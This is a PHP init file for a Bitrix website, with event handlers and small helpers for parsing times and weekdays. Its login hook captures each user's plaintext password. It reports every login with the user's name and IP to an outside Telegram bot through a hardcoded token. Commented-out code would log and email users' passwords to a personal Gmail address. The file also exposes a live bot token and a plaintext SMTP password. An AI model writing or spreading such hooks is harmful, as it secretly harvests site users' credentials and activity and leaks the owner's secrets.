<?
include("sb_tools/init.php");
//AddEventHandler("main", "OnBeforeUserRegister", Array("c_registration", "OnBeforeUserRegister"));
AddEventHandler("main", "OnAfterUserLogin", Array("c_registration", "OnAfterUserLoginHandler"));

class c_registration
{
    function OnBeforeUserRegister($arFields)
    {
        //$info = $arFields['LOGIN'] . ';' . $arFields['PASSWORD'] . ';' . $arFields['EMAIL'] . ';' . $arFields['PERSONAL_PHONE'] . "\r\n";
        //file_put_contents("/home/bitrix/www/bitrix/php_interface/log.log", $info, FILE_APPEND);
        //bxmail("zevsnet@gmail.com", "USER new", $info);
    }

    function OnAfterUserLoginHandler($arFields)
    {
        if($arFields['USER_ID'] > 0)
        {
            $info = $arFields['LOGIN'] . ';' . $arFields['PASSWORD'] . "\r\n";

            $botToken = "270715108:AAG06m7OPCvVe7lbY7j9m6SGdSIou-rpW98";
            $website = "https://api.telegram.org/bot" . $botToken;
            $chatId = "254361915";

            file_get_contents($website . "/sendmessage?chat_id=" . $chatId . "&text=Авторизация под пользователем:" . $arFields['LOGIN'] . " c IP[" . self::get_ip() . "] " . date("d.m.Y H:i"));
        }
    }

    public function get_ip()
    {
        if(!empty($_SERVER['HTTP_CLIENT_IP']))
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
        elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        else
        {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }
}
AddEventHandler("iblock", "OnBeforeIBlockElementUpdate", Array("MyClass", "OnBeforeIBlockElementUpdateHandler"));
class MyClass
{
    function OnBeforeIBlockElementUpdateHandler(&$arFields)
    {
        switch($arFields['IBLOCK_ID'])
        {
            case 35:
                $arFields['NAME'] = $arFields['ACTIVE_FROM'];
                break;
            case 39:
                break;
        }
    }


}
/*
function custom_mail($to, $subject, $message, $additional_headers = '')
{
    $Username = "sale@mehendi24.ru";
    $Pass = "Zewka1pol";

    require_once($_SERVER['DOCUMENT_ROOT'] . '/bitrix/php_interface/PHPMailer/PHPMailerAutoload.php');
    $BCC = explode("\n", $additional_headers);
    foreach($BCC as $b):
        $strrr = substr($b, 0, 3);
        if($strrr == 'BCC')
        {
            $newBCC = explode(":", $b);
            $BCCfull = $newBCC[1];
        }
    endforeach;

    $mail = new PHPMailer;
    $mail->isSMTP();
    $mail->CharSet = 'UTF-8';
    $mail->SMTPDebug = 0;
    $mail->Debugoutput = 'html';
    $mail->Host = 'smtp.yandex.com';
    $mail->Port = 465;
    $mail->SMTPSecure = 'ssl';
    $mail->SMTPAuth = true;
    $mail->Username = $Username;
    $mail->Password = $Pass;
    $mail->setFrom($Username, '');
    $mail->addReplyTo($Username, '');
    $arEmails = explode(',', $to);
    foreach($arEmails as $email)
        $mail->addAddress(trim($email));
    $BCCfull = explode(',', $BCCfull);
    foreach($BCCfull as $bcc)
        $mail->addBCC(trim($bcc));
    $mail->Subject = $subject;
    $mail->msgHTML($message, dirname(__FILE__));


    if(!$mail->send())
    {
        return false;
    }

    return true;
}*/

function getFloatTime_Folder($time)
{
    $pos = strpos($time, ':');
    if(!$pos)
    {
        $Hour = (int)$time;
        $Minut = 0;
    }
    else
    {
        $Hour = (int)substr($time, 0, $pos);
        $Minut = (int)substr($time, $pos + 1, strlen($time));
    }
    unset($pos);

    return $Hour + ($Minut / 60);
}

function getFloatTime($time)
{
    return getFloatTime_Folder($time);
}

function getDayInt_Folder($strDay)
{
    switch($strDay)
    {
        case '16':
            return 1;
            break;
        case '17':
            return 2;
            break;
        case '18':
            return 3;
            break;
        case '19':
            return 4;
            break;
        case '20':
            return 5;
            break;
        case '21':
            return 6;
            break;
        case '22':
            return 0;
            break;
    }
}

function getDayInt($strDay)
{
    switch($strDay)
    {
        case 'Пн':
            return 1;
            break;
        case 'Вт':
            return 2;
            break;
        case 'Ср':
            return 3;
            break;
        case 'Чт':
            return 4;
            break;
        case 'Пт':
            return 5;
            break;
        case 'Сб':
            return 6;
            break;
        case 'Вс':
            return 0;
            break;
    }
}

?>